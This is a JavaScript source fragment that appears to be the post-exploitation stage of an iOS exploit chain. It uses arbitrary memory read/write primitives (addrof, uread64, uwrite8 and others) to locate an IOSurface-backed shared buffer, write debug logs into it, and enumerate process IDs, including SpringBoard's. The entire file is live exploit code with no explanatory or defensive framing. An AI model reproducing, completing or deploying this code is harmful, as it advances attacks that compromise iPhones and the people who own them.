// PE main - reads pre-computed results from IOSurface
let fob = uread64(addrof(func_offsets_array) + 0x10n);
let surf = uread64(fob + 19n * 8n);
let slog = surf + 0xF000n;
let slop = surf + 0xF000n + 0xE00n;

function pw(msg) {
  let cs = get_cstring(msg + "\n");
  let off = uread64(slop);
  let n = 0n;
  for (let i = 0n; i < 200n && off + i < 0xE00n - 1n; i++) {
    let ch = uread8(cs + i);
    if (ch == 0n) break;
    uwrite8(slog + off + i, ch);
    n = i + 1n;
  }
  uwrite64(slop, off + n);
}

pw("[PE] A: start");

let our_pid = uread64(surf + 0xF830n);
pw("[PE] B: pid=" + our_pid);

let plist_buf = uread64(surf + 0xF838n);
let plist_count = uread64(surf + 0xF840n);
let sb_pid = uread64(surf + 0xF848n);
pw("[PE] C: cnt=" + plist_count + " sb=" + sb_pid);

if (sb_pid != 0n) {
  pw("[PE] D: SpringBoard PID=" + sb_pid);
} else {
  pw("[PE] D: SpringBoard not found yet");
  // Dump a few more PIDs
  if (plist_buf != 0n && plist_count > 0n) {
    let num = plist_count / 4n;
    let pids = [];
    for (let i = 0n; i < num && i < 30n; i++) {
      let addr = plist_buf + i * 4n;
      let aligned = addr & ~7n;
      let val = uread64(aligned);
      let shift = (addr - aligned) * 8n;
      let p = (val >> shift) & 0xFFFFFFFFn;
      if (p == 0n) continue;
      pids.push("["+i+"]="+p);
    }
    pw("[PE] E: first 30: " + pids.join(" "));
  }
}

pw("[PE] DONE");
